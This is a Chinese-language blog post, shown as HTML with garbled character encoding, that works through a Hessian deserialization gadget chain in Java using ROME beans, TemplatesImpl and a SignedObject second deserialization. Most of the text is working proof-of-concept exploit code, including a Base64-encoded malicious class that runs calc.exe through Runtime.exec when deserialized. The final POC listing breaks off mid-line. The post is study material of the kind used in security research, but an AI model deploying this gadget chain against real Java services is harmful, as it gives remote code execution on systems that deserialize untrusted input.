class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(String.class, <span class="hljs-string">&quot;xsw6a&quot;</span>));<br><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> ObjectBean.class.getDeclaredField(<span class="hljs-string">&quot;equalsBean&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set( root, <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ObjectBean.class, delegate));<br><br>        serialize(root);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// åºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">hessianOutput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(byteArrayOutputStream);<br>        hessianOutput.writeObject(obj);<br>        byteArrayOutputStream.toByteArray();<br><br>        <span class="hljs-comment">//å†™å…¥æ–‡ä»¶</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>        fileOutputStream.write(byteArrayOutputStream.toByteArray());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//è¯»å–æ–‡ä»¶</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename);<br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">read</span> <span class="hljs-operator">=</span> fileInputStream.read(bytes);<br>        <span class="hljs-comment">//ååºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">hi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(byteArrayInputStream);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hi.readObject();<br>        System.out.println(o);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å‡ºç°äº†æŠ¥é”™ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203282235450.png" alt="QQæˆªå›¾20220328174030"></p><p>çœ‹çœ‹æ˜¯ä»€ä¹ˆæŠ¥é”™ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203282235402.png" alt="QQæˆªå›¾20220328174157"></p><p><strong>è¢«transientä¿®é¥°çš„ _tfactory å¯¹è±¡æ— æ³•å†™å…¥é€ æˆç©ºæŒ‡é’ˆå¼‚å¸¸ã€‚</strong></p><h2 id="äºŒæ¬¡ååºåˆ—åŒ–"><a href="#äºŒæ¬¡ååºåˆ—åŒ–" class="headerlink" title="äºŒæ¬¡ååºåˆ—åŒ–"></a>äºŒæ¬¡ååºåˆ—åŒ–</h2><p>åˆæ˜¯æ–°å§¿åŠ¿ã€‚</p><h3 id="java-security-SignedObject"><a href="#java-security-SignedObject" class="headerlink" title="java.security.SignedObject"></a>java.security.SignedObject</h3><p>è¿™é‡Œä¼šè¯»å–ä¼ å…¥çš„å†…å®¹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203281843774.png" alt="QQæˆªå›¾20220328184255"></p><p>è¿™é‡Œå…ˆå¯ä»¥æ¥è¯•ä¸€ä¸‹è¿™ä¸ªå‡½æ•°å…·ä½“æ€ä¹ˆç”¨çš„ã€‚ï¼ˆ<a href="https://www.apiref.com/android-zh/java/security/SignedObject.html">SignedObject</a>ï¼‰</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">transient</span> String xs;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getXs</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> xs;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setXs</span><span class="hljs-params">(String xs)</span> &#123;<br>        <span class="hljs-built_in">this</span>.xs = xs;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age, String xs)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.xs = xs;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, xs=&#x27;&quot;</span> + xs + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.security.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PersonSign</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException, IOException, SignatureException, InvalidKeyException, ClassNotFoundException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;xsw6a&quot;</span>, <span class="hljs-number">20</span>, <span class="hljs-string">&quot;xs&quot;</span>);<br>        KeyPairGenerator keyPairGenerator;<br>        keyPairGenerator = KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br><br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">so</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(person, privateKey, signingEngine);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> so.getObject();<br>        System.out.println(object);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆè¿™é‡Œä¸€å®šè¦æœ‰<code>privateKey</code>ï¼Œ <code>signingEngine</code>             ?_ï¼Ÿ<br>è°ƒè¯•çœ‹ä¸€ä¸‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203281945411.png" alt="QQæˆªå›¾20220328194509"><br>å»ç§ç§ã€‚<br>**SignedObject#sign()**ä¸­ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203282235039.png" alt="QQæˆªå›¾20220328194644"></p><p><strong>null.æ–¹æ³•ï¼Ÿ</strong>æ‰€ä»¥æŠ¥é”™ã€‚</p><h2 id="ç ´å±€"><a href="#ç ´å±€" class="headerlink" title="ç ´å±€"></a>ç ´å±€</h2><p>å›åˆ°ä¸»é¢˜ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨åŸç”Ÿååºåˆ—åŒ–ã€‚<br>è¿™é‡Œæˆ‘çš„ä»¬çš„åˆ©ç”¨ç‚¹è¿˜æ˜¯è¦è°ƒç”¨åˆ°<strong>SignedObject#getObject()<strong>ä¸­ã€‚è¿™é‡Œçš„</strong>getObject</strong>ï¼Œæ»¡è¶³getteræ–¹æ³•ã€‚æ‰€ä»¥è¯´æˆ‘ä»¬è¿˜æ˜¯è¦åˆ©ç”¨<strong>ToStringBean#toString</strong>ï¼Œæ¥å½¢æˆè°ƒç”¨getteræ–¹æ³•(<strong>SignedObject#getObject</strong>)ã€‚<br>äºæ˜¯å‘¼æœ‰å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ä¿®é¥°è°ƒç”¨getteræ–¹æ³•ï¼ŒgetObject</span><br>  <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(SignedObject.class, so);<br>  <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, delegate);<br></code></pre></td></tr></table></figure><h2 id="SignedObject-getObject"><a href="#SignedObject-getObject" class="headerlink" title="SignedObject#getObject()"></a>SignedObject#getObject()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301318346.png" alt="QQæˆªå›¾20220330131752"></p><p>è¿™é‡Œç›¸å½“äºæ˜¯åˆ©ç”¨äº†<code>Template#readObject</code>ï¼Œé‡Œé¢çš„readObjectï¼Œç»™å…¶èµ‹å€¼äº†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301319274.png" alt="QQæˆªå›¾20220330131919"></p><h2 id="JDKUtil-makemap"><a href="#JDKUtil-makemap" class="headerlink" title="JDKUtil#makemap()"></a>JDKUtil#makemap()</h2><p>è¿™é‡Œéœ€è¦å¯¼å…¥ä¸€ä¸‹<strong>marshalsec</strong>åŒ…ã€‚ï¼ˆåˆ«åˆ°å«æœ‰allçš„åŒ…ï¼Œä¼šæŠ¥é”™ã€‚ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203282235503.png" alt="QQæˆªå›¾20220328211213"></p><p>çœ‹çœ‹è¿™ä¸ª<strong>makemap()</strong>,å¹²äº†äº›ä»€ä¹ˆï¼Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203282235981.png" alt="QQæˆªå›¾20220328220452"></p><p>æ²¡æ‡‚ã€‚ã€‚ã€‚ã€‚ã€‚æ„Ÿè§‰ä½œç”¨å°±æ˜¯æŠŠä¸¤ä¸ªå¯¹è±¡ï¼Œéƒ½æ”¾å…¥ä¸€ä¸ªmapé‡Œã€‚</p><p><strong>æ³¨æ„è¿™é‡Œå…¶å®åªè¦æ˜¯ä¸ªå°è£…çš„mapç±»å‹å°±å¯ä»¥äº†ã€‚</strong>ï¼ˆè¿™ä¸ªæƒ³æ³•æ˜¯é”™çš„ï¼Œå› ä¸ºè¿™é‡Œæ²¡æœ‰è¿›å…¥ååºåˆ—åŒ–ï¼Œå°±æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨äº†ã€‚emmmmï¼Œå§‘ä¸”ç†è§£ä¸€ä¸‹ï¼Œè¿™é‡Œçš„mapè¿™ä¹ˆè®¾ç½®æ˜¯å¯ä»¥é¿å…åœ¨è¿›å…¥ååºåˆ—åŒ–ä¹‹å‰å¼¹å‡ºè®¡ç®—å™¨ï¼ï¼ï¼ï¼ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301316864.png" alt="QQæˆªå›¾20220330131616"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> marshalsec.gadgets.JDKUtil;<br><br><br><span class="hljs-keyword">import</span> java.security.*;<br><br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span 